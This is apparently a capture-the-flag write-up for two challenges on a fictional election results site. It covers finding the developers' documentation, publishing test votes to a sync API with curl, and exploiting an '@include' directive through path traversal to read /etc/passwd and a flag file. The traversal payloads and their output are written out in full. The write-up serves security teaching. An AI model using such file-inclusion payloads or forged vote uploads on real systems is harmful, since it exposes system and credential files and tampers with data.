# This Things Rigged
In this challenge, we're provided with the URL to a "tallyroom" website, with live updates of a vote count in a fictional election. The description of the challenge mentions that the new system is "decentralized and distributed" but asks where to documentation for the system is.
### Who Are the Devs?
The challenge states that brute-forcing with `gobuster` or similar tools is not required, so we can assume that the website itself contains all the information required to find the documentation we're looking for. The website has several pages, with information on the parties, information the different states, and a news page with several articles. If we look at all the articles we can see the IDs are sequential, but the news page doesn't list all the articles available if we assume the numbering starts from 0. If we try and access the article with ID 0, we get some information on the website itself!
>This page about Freedonia's digital voting infrastructure is currently being developed. Our organization Freedonia Government Services' (the Freedonian government services directorate) is working hard to bring you comprehensive information about the technology that powers our democratic process.

So now we know the name of the developers of this website! If you finished *Log of Doom* you might have seen the GitHub `README` for the *Freedonia Vote Synchronization System*. The author of this information is the "Freedonia Government Services", the same name mentioned on the website, so this is likely the documentation we're looking for. Alternatively, we can just search GitHub users for "Freedonia Government Services" and find the account that way.
### Where is the Service?
At the time I completed the challenge, the URL hadn't been updated to the `sync.tallyroom.freedonia.vote` URL, so I needed to figure out where the URL myself. Eventually I noticed that the URL listed at the time was on the `sync.` subdomain, and trying this on the `tallyroom.freedonia.vote` URL let me find the server.
### Follow the Guide
Now that we have the documentation and the server URL, we can follow the instructions in the "Testing" section to connect to the service and publish some test votes.
```
dot@stuff:~$ curl https://sync.tallyroom.freedonia.vote/healthz
{"status":"ok"}
dot@stuff:~$ curl -N "https://sync.tallyroom.freedonia.vote/api/votes/subscribe/Izzi"
event:vote-update
data:{"ID":0,"CreatedAt":"0001-01-01T00:00:00Z","UpdatedAt":"0001-01-01T00:00:00Z","DeletedAt":null,"state_id":8,"party_id":1,"votes":58676,"percentage":16.00034904299501,"timestamp":"2025-07-30T19:22:10.005139622+10:00","update_source":"Izzi"}
```
With our subscription setup we can create our test file and publish it to the server.
```
dot@stuff:~$ echo "1,1,1000,50.0,Test Upload" > test.rsu
dot@stuff:~$ curl -X POST -F "file=@test.rsu" "https://sync.tallyroom.freedonia.vote/api/votes/publish/Izzi"

{"filename":
...
```
In our terminal with the subscription to the Izzi votes, we should see the following line appear:
```
event:vote-update
data:{"ID":0,"CreatedAt":"0001-01-01T00:00:00Z","UpdatedAt":"0001-01-01T00:00:00Z","DeletedAt":null,"state_id":1,"party_id":1,"votes":1000,"percentage":50,"timestamp":"2025-07-30T09:22:12.013399822Z","update_source":"SECEDU{h00k_th3_v0te}"}
```
# Digital Ballots
Now that we've found the documentation and the server, we can go on to complete the next challenge. The description doesn't provide much in the way of hints for this one, but if we go back to the documentation for the service we can find the existence of an `@include` directive for RSU files. This is probably relevant to the challenge, with the most likely use being local file inclusion.
### Trying an Include
To begin, let's try creating a simple RSU file with just an include directive and send it to the server.
```
dot@stuff:~$ echo "@include \"test.rsu\"" > test.rsu
dot@stuff:~$ curl -X POST -F "file=@test.rsu" "https://sync.tallyroom.freedonia.vote/api/votes/publish/Izzi"
{"error":"RSU parsing error: Line 1: include path outside input directory"}
```
Hmm, this error is a little odd because it's telling us that the path is outside the expected directory, rather than telling us the file doesn't exist. Let's try adding "include" to our path.
```
dot@stuff:~$ echo "@include \"input/test.rsu\"" > test.rsu
dot@stuff:~$ curl -X POST -F "file=@test.rsu" "https://sync.tallyroom.freedonia.vote/api/votes/publish/Izzi"
{"error":"RSU parsing error: Line 1: include path outside input directory"}
```
Same result. What about using an absolute path?
```
dot@stuff:~$ echo "@include \"/input/test.rsu\"" > test.rsu
dot@stuff:~$ curl -X POST -F "file=@test.rsu" "https://sync.tallyroom.freedonia.vote/api/votes/publish/Izzi"
{"error":"RSU parsing error: Line 1: failed to include /input/test.rsu: failed to open file /input/input/test.rsu: open /input/input/test.rsu: no such file or directory"}
```
Great! Now we know we have to include `/input/` at the start of our path, let's try some traversal and see if it works. 
### Finding the Flag
We can see from the path in the error message before that we should use `..` twice to get to the root path.
```
dot@stuff:~$ echo "@include \"/input/../../etc/passwd\"" > test.rsu
dot@stuff:~$ curl -X POST -F "file=@test.rsu" "https://sync.tallyroom.freedonia.vote/api/votes/publish/Izzi"
{"error":"RSU parsing error: Line 1: error in included file /input/../../etc/passwd: Line 1: insufficient columns - need at least 4, got 1: root:x:0:0:root:/root:/bin/bash"}
```
Perfect, we can traverse through the filesystem, and see part of the file we're trying to access. Now we can try and find the flag. The easiest place to look is the root directory so let's try there.
```
dot@stuff:~$ echo "@include \"/input/../../flag.txt\"" > test.rsu
dot@stuff:~$ curl -X POST -F "file=@test.rsu" "https://sync.tallyroom.freedonia.vote/api/votes/publish/Izzi"
{"error":"RSU parsing error: Line 1: error in included file /input/../../flag.txt: Line 1: insufficient columns - need at least 4, got 1: SECEDU{es0t3ric}"}%
```
First try! (Though not really.) Other places to try if the flag weren't there would be `/root`, `/app`, or just `flag` without the `.txt` extension.